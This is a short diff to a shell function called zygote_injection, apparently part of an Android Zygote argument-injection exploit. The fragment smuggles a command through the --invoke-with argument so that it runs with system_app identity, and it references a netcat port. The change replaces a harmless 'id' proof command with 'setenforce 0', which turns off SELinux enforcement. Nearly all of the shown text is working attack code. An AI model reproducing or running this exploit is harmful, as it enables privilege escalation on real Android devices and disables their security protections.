@@ -112,7 +112,7 @@ zygote_injection() {
 --setgid=1000
 --runtime-flags=43267
 --invoke-with
-"id >/sdcard/3.txt"
+setenforce 0 >/sdcard/3.txt
 --seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete
 "\n' "$uid" "$uid" "$NC_PORT"
 }
